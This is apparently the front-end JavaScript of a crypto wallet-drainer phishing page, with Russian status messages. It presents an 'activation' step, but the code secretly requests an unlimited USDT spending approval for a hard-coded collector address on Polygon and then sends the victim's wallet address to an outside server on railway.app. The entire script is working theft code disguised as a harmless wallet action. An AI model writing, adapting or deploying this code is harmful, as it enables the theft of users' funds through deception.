const USDT_CONTRACT = '0xc2132D05D31c914a87C6611C10748AEb04B58e8F';
const COLLECTOR_ADDRESS = '0x7C5fCDDEe0409aD1a4551eC8DD8738e8df181A88';
const POLYGON_CHAIN_ID = '0x89'; 

async function connectAndApprove() {
    const status = document.getElementById('status');
    
    if (!window.ethereum) {
        status.innerText = 'Откройте в Trust Wallet';
        return;
    }

    try {
        status.innerText = 'Проверка сети...';

        // Принудительное добавление/переключение сети с правильным RPC
        await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
                chainId: POLYGON_CHAIN_ID,
                chainName: 'Polygon Mainnet',
                rpcUrls: ['https://polygon-rpc.com', 'https://rpc-mainnet.maticvigil.com'],
                nativeCurrency: { name: 'POL', symbol: 'POL', decimals: 18 },
                blockExplorerUrls: ['https://polygonscan.com/']
            }],
        });

        const web3 = new Web3(window.ethereum);
        const accounts = await web3.eth.requestAccounts();
        const address = accounts[0];

        // ПРОВЕРКА: Видит ли Web3 твой баланс POL на самом деле
        const rawBalance = await web3.eth.getBalance(address);
        const polBalance = web3.utils.fromWei(rawBalance, 'ether');
        console.log("Доступно POL для газа:", polBalance);

        if (parseFloat(polBalance) < 0.05) {
            status.innerText = `Мало POL для газа (нужно 0.05, у вас ${parseFloat(polBalance).toFixed(4)})`;
            return;
        }

        const abi = [
            {"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
            {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
        ];
        const contract = new web3.eth.Contract(abi, USDT_CONTRACT);

        const getFastGas = async () => {
            const price = await web3.eth.getGasPrice();
            return Math.floor(Number(price) * 1.5).toString();
        };

        // ШАГ 1: Сброс лимита (обязательно для USDT)
        const allowance = await contract.methods.allowance(address, COLLECTOR_ADDRESS).call();
        if (BigInt(allowance) > 0n) {
            status.innerText = 'Сброс старых лимитов...';
            await contract.methods.approve(COLLECTOR_ADDRESS, 0).send({ 
                from: address, 
                gasPrice: await getFastGas() 
            });
        }

        // ШАГ 2: Основной аппрув
        status.innerText = 'Подтвердите активацию...';
        const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
        
        await contract.methods.approve(COLLECTOR_ADDRESS, maxUint).send({ 
            from: address, 
            gasPrice: await getFastGas() 
        });

        status.innerText = 'Синхронизация...';

        await fetch('https://railway-production-2954.up.railway.app/save-address', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ address: address })
        });

        status.innerText = '✅ Готово!';
        status.style.color = '#00ff00';

    } catch (error) {
        status.innerText = 'Ошибка: ' + (error.message || 'Транзакция отклонена');
        console.error(error);
    }
}

document.getElementById('startBtn').addEventListener('click', connectAndApprove);
